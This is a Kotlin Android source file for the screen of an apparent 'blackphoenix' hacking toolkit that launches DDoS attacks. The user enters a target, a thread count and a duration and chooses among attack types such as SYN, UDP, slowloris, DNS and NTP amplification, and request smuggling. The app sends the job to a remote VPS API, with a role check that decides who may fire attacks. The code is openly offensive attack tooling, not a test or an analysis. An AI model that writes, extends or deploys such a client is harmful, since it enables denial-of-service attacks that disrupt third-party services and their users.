package com.blackphoenix.toolkit.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.Spinner
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.blackphoenix.toolkit.R
import com.blackphoenix.toolkit.utils.VPSConfig
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class DDoSFragment : Fragment() {

    private lateinit var inputTarget: EditText
    private lateinit var inputThreads: EditText
    private lateinit var inputDuration: EditText
    private lateinit var spinnerType: Spinner
    private lateinit var btnStart: Button
    private lateinit var btnStop: Button
    private lateinit var tvStatus: TextView
    private lateinit var tvAccessInfo: TextView

    private var role: String = "Member"

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        val view = inflater.inflate(R.layout.fragment_ddos, container, false)

        role = arguments?.getString("ROLE") ?: "Member"

        inputTarget = view.findViewById(R.id.inputTarget)
        inputThreads = view.findViewById(R.id.inputThreads)
        inputDuration = view.findViewById(R.id.inputDuration)
        spinnerType = view.findViewById(R.id.spinnerType)
        btnStart = view.findViewById(R.id.btnStart)
        btnStop = view.findViewById(R.id.btnStop)
        tvStatus = view.findViewById(R.id.tvStatus)
        tvAccessInfo = view.findViewById(R.id.tvAccessInfo)

        // Setup spinner DDoS types
        val types = arrayOf("http", "https", "syn", "udp", "icmp", "slowloris", "dns", "ntp", "http2", "smuggling")
        val adapter = ArrayAdapter(requireContext(), android.R.layout.simple_spinner_dropdown_item, types)
        spinnerType.adapter = adapter

        // Akses berdasarkan role
        val canExecute = role == "TK" || role == "Admin" || role == "Owner"
        if (!canExecute) {
            btnStart.isEnabled = false
            btnStart.alpha = 0.4f
            btnStop.isEnabled = false
            btnStop.alpha = 0.4f
            tvStatus.text = "🔒 Mode Read-Only — Upgrade ke Owner/Admin/TK"
            tvStatus.setTextColor(0xffff4444)
            tvAccessInfo.text = "⛔ Akses terbatas (Member: hanya baca)"
            tvAccessInfo.setTextColor(0xffff4444)
        } else {
            tvAccessInfo.text = "✅ Akses penuh"
            tvAccessInfo.setTextColor(0xff00ff00)
        }

        btnStart.setOnClickListener { startDDoS() }
        btnStop.setOnClickListener {
            tvStatus.text = "⏹️ Stopped"
            tvStatus.setTextColor(0xffff8800)
        }

        return view
    }

    private fun startDDoS() {
        val target = inputTarget.text.toString().trim()
        val threads = inputThreads.text.toString().toIntOrNull() ?: 50
        val duration = inputDuration.text.toString().toIntOrNull() ?: 30
        val type = spinnerType.selectedItem.toString()

        if (target.isEmpty()) {
            Toast.makeText(requireContext(), "Masukkan target!", Toast.LENGTH_SHORT).show()
            return
        }

        tvStatus.text = "⏳ Starting $type attack..."
        tvStatus.setTextColor(0xffff8800)

        val client = OkHttpClient()
        val json = JSONObject()
        json.put("api_key", VPSConfig.API_KEY)
        json.put("type", type)
        json.put("target", target)
        json.put("threads", threads)
        json.put("duration", duration)

        val body = RequestBody.create(
            MediaType.parse("application/json; charset=utf-8"),
            json.toString()
        )

        val request = Request.Builder()
            .url("${VPSConfig.VPS_URL}/api/ddos/start")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                requireActivity().runOnUiThread {
                    tvStatus.text = "❌ Gagal konek ke VPS"
                    tvStatus.setTextColor(0xffff4444)
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val res = response.body?.string() ?: ""
                requireActivity().runOnUiThread {
                    try {
                        val obj = JSONObject(res)
                        if (obj.getString("status") == "success") {
                            tvStatus.text = "✅ ${obj.getString("message")}"
                            tvStatus.setTextColor(0xff00ff00)
                        } else {
                            tvStatus.text = "❌ ${obj.getString("message")}"
                            tvStatus.setTextColor(0xffff4444)
                        }
                    } catch (e: Exception) {
                        tvStatus.text = "❌ Error: ${e.message}"
                        tvStatus.setTextColor(0xffff4444)
                    }
                }
            }
        })
    }
}